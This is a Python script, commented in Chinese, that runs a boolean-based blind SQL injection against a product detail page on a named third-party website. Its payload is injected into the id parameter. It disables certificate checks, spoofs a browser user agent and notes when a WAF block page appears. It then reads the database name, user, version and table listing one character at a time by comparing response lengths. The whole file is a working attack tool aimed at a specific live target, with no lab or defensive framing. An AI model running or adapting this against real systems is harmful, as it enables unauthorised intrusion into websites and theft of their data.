#!/usr/bin/env python3
"""yijing_blind_dump.py - yijingweb.com 布尔盲注提取数据库信息
通道: id=687' and if(条件,687,0)#  真/假响应长度差异
"""
import urllib.request, urllib.parse, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php'

def q(cond):
    """执行布尔盲注查询, 返回True/False"""
    # 用if(cond,687,0) - 真返回687详情(长), 假返回空(短)
    payload = "687' and if(%s,687,0)#" % cond
    url = BASE + '?id=' + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(60000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(60000).decode('utf-8','ignore')
    except Exception:
        return None
    if 'WTS-WAF' in b:
        return None  # WAF拦截
    # 真=含产品详情(长页面), 假=短页面
    return len(b) > 23500  # 阈值: 真约25998/假约22768 或 23713

def get_char(expr, pos):
    """二分提取单个字符ASCII"""
    lo, hi = 0, 127
    for _ in range(7):
        mid = (lo + hi) // 2
        r = q("ascii(substr(%s,%d,1))>%d" % (expr, pos, mid))
        if r is None:
            return None
        if r:
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_len(expr):
    lo, hi = 0, 64
    for _ in range(7):
        mid = (lo + hi) // 2
        r = q("length(%s)>%d" % (expr, mid))
        if r is None:
            return None
        if r:
            lo = mid + 1
        else:
            hi = mid
    return lo

def dump(expr, name):
    print('[%s] 提取...' % name, flush=True)
    ln = get_len(expr)
    print('[%s] length=%s' % (name, ln), flush=True)
    if ln is None or ln > 64:
        return '?'
    s = ''
    for i in range(1, ln+1):
        c = get_char(expr, i)
        if c is None:
            s += '?'
        else:
            s += chr(c)
        if i % 8 == 0:
            print('  [%s] %d/%d: %s' % (name, i, ln, s), flush=True)
    print('[%s] 结果: %s' % (name, s), flush=True)
    return s

if __name__ == '__main__':
    # 先验证通道稳定
    t = q('1=1')
    f = q('1=2')
    print('通道验证: 真=%s 假=%s' % (t, f), flush=True)
    if t is None or f is None or t == f:
        print('通道不稳定或WAF拦截, 退出', flush=True)
        sys.exit(1)
    print('=== 布尔盲注通道OK ===', flush=True)

    db = dump('database()', 'database')
    user = dump('user()', 'user')
    version = dump('version()', 'version')

    # 提取表名(先看有几个表)
    tbl_count = get_len("(select group_concat(table_name) from information_schema.tables where table_schema=database())")
    print('[tables] group_concat长度=%s' % tbl_count, flush=True)

    print('\n=== 结果汇总 ===', flush=True)
    print('database:', db, flush=True)
    print('user:', user, flush=True)
    print('version:', version, flush=True)
